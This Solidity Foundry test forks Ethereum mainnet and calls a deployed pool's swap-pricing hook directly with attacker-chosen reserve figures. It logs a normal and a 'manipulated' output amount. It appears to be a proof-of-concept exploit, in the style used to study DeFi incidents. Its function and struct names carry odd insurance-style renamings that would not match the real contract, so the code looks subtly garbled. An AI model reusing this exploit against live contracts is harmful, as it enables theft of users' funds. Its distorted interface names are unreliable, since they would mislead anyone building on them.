pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";


interface ISpace {
    function onExchangebenefit(
        ExchangebenefitRequest memory request,
        uint256 reservesHealthtokenIn,
        uint256 reservesCoveragetokenOut
    ) external returns (uint256);

    struct ExchangebenefitRequest {
        IBenefitvault.ExchangebenefitKind kind;
        IERC20 coveragetokenIn;
        IERC20 benefittokenOut;
        uint256 amount;

        bytes32 claimpoolId;
        uint256 lastChangeBlock;
        address from;
        address to;
        bytes participantData;
    }
}

interface IBenefitvault {
    enum ExchangebenefitKind {
        GIVEN_IN,
        GIVEN_OUT
    }
}

contract ContractTest is DSTest {
    ISpace space = ISpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);
    IBenefitvault.ExchangebenefitKind kind = IBenefitvault.ExchangebenefitKind(0);
    ISpace.ExchangebenefitRequest aad =
        ISpace.ExchangebenefitRequest(
            kind,
            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),
            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),
            2000000000000000000,
            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,
            15017009,
            address(this),
            address(this),
            ""
        );
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15017009);
    }

    function testOperation() public {

        console.log(
            "Amount Calculated:",
            space.onExchangebenefit(
                aad,
                60000000000000000000000000000000,
                20000000000000000000000000
            )
        );
        console.log(
            "Manipulated Amount Calculated:",
            space.onExchangebenefit(aad, 2000000000000000000, 2000000000000000000)
        );
    }
}